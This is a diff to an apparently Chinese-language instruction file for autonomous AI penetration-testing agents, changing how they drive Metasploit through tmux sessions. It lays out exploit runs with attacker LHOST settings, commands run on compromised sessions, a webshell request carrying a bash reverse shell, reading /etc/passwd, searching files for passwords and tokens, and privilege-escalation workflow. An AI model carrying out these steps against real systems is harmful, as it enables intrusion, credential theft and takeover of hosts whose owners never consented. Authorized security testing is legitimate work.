@@ -447,23 +447,33 @@ nuclei -u TARGET -t SESSION_DIR/pocs/CVE-XXXX.yaml -json -silent
     ShellSession({ action: "exec", session_id: "shell_4444", command: "cat /etc/passwd" })
     ShellSession({ action: "exec", session_id: "shell_4444", command: "uname -a && ip a" })
 
-## Metasploit 使用规范（重要，防止阻塞）
+## Metasploit 使用规范（必须用 TmuxSession）
 
-⚠️ 绝对禁止：msfconsole -x "...; run" 前台运行 — 获得 meterpreter session 后会停在交互提示符，挂满超时。
+⚠️ 绝对禁止：在 Bash 中直接运行 msfconsole — 获得 session 后停在交互提示符，挂满超时。
+✅ 必须用 TmuxSession 管理 msfconsole 全程：
 
-必须用资源文件 + run -z + run_in_background：
+    # 步骤 1：创建 tmux 会话启动 msfconsole
+    TmuxSession({ action: "new", session: "msf", command: "msfconsole -q" })
 
-    # 写资源文件
-    Bash({ command: "cat > /tmp/msf.rc << 'RCEOF'\\nuse exploit/{模块}\\nset RHOSTS {IP}\\nset LHOST {ATTACKER_IP}\\nset LPORT 4444\\nrun -z\\nsleep 15\\nsessions -i 1 -C 'id; whoami; uname -a'\\nexit -y\\nRCEOF" })
+    # 步骤 2：等待启动（首次约 30-60s）
+    TmuxSession({ action: "wait_for", session: "msf", pattern: "msf6 >", timeout: 60000 })
 
-    # 后台执行，输出到文件
-    Bash({ command: "msfconsole -q -r /tmp/msf.rc > SESSION_DIR/msf_out.txt 2>&1", run_in_background: true })
+    # 步骤 3：配置并运行 exploit
+    TmuxSession({ action: "send", session: "msf", text: "use exploit/{模块路径}" })
+    TmuxSession({ action: "wait_for", session: "msf", pattern: "msf6.*>" })
+    TmuxSession({ action: "send", session: "msf", text: "set RHOSTS {目标IP}" })
+    TmuxSession({ action: "send", session: "msf", text: "set LHOST {攻击机IP}" })
+    TmuxSession({ action: "send", session: "msf", text: "set LPORT 4444" })
+    TmuxSession({ action: "send", session: "msf", text: "run -j" })
 
-    # 轮询结果（看到 "session 1 opened" 或 "uid=" 表示成功）
-    Bash({ command: "sleep 20 && tail -50 SESSION_DIR/msf_out.txt" })
+    # 步骤 4：等待 session 建立（最多等 2 分钟）
+    TmuxSession({ action: "wait_for", session: "msf", pattern: "session \\d+ opened", timeout: 120000 })
 
-run -z 含义：exploit 后不进入交互式 meterpreter，session 在后台保持。
-exit -y 含义：即使有活跃 session 也强制退出 msfconsole。
+    # 步骤 5：对 session 执行命令
+    TmuxSession({ action: "send", session: "msf", text: "sessions -i 1 -C 'id; whoami; uname -a; hostname'" })
+    TmuxSession({ action: "capture", session: "msf", lines: 30 })
+
+run -j 含义：exploit 在后台 job 运行，session 建立后不进入 meterpreter 交互，可继续输入命令。
 
 ## 成功拿到 shell 后
 - 保存 shell 类型/方式/反弹端口到 SESSION_DIR/shells.txt
@@ -547,10 +557,15 @@ curl -s "http://TARGET/path/ws.php" --data-urlencode "c=bash -c 'bash -i >& /dev
    ShellSession({ action: "list" })  ← 先检查有无活跃会话
    ShellSession({ action: "exec", session_id: "shell_4444", command: "id" })
 
-2. **WebShell（有 webshell 时）**：
+2. **TmuxSession msf 会话** — 如果 exploit agent 用 msfconsole 拿到 meterpreter：
+   TmuxSession({ action: "list" })  ← 检查 msf 会话是否还活着
+   TmuxSession({ action: "send", session: "msf", text: "sessions -i 1 -C 'id; whoami'" })
+   TmuxSession({ action: "capture", session: "msf", lines: 15 })
+
+3. **WebShell（有 webshell 时）**：
    curl -s "http://TARGET/path/ws.php?c=id"
 
-3. **重新建立反弹 shell（以上都不可用）**：
+4. **重新建立反弹 shell（以上都不可用）**：
    ShellSession({ action: "listen", port: 4445, log_dir: SESSION_DIR })
    # 然后触发反弹
 
@@ -558,6 +573,7 @@ curl -s "http://TARGET/path/ws.php" --data-urlencode "c=bash -c 'bash -i >& /dev
 
 ### 0. 先检查现有 shell
 ShellSession({ action: "list" })
+TmuxSession({ action: "list" })  ← 同时检查 tmux 会话
 # 如有连接的 session，直接用它执行后续所有命令
 
 ### 1. 基础信息收集
@@ -602,7 +618,8 @@ find / -name "*.txt" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|toke
 分析目标系统权限配置，找到并利用提权漏洞，获得最高权限。
 
 ## Shell 交互方式
-优先：ShellSession({ action: "exec", session_id: "shell_PORT", command: "..." })
+优先 1：ShellSession({ action: "exec", session_id: "shell_PORT", command: "..." })
+优先 2：TmuxSession msf 会话 — sessions -i N -C "command"
 备用：curl webshell
 
 ## Linux 提权流程
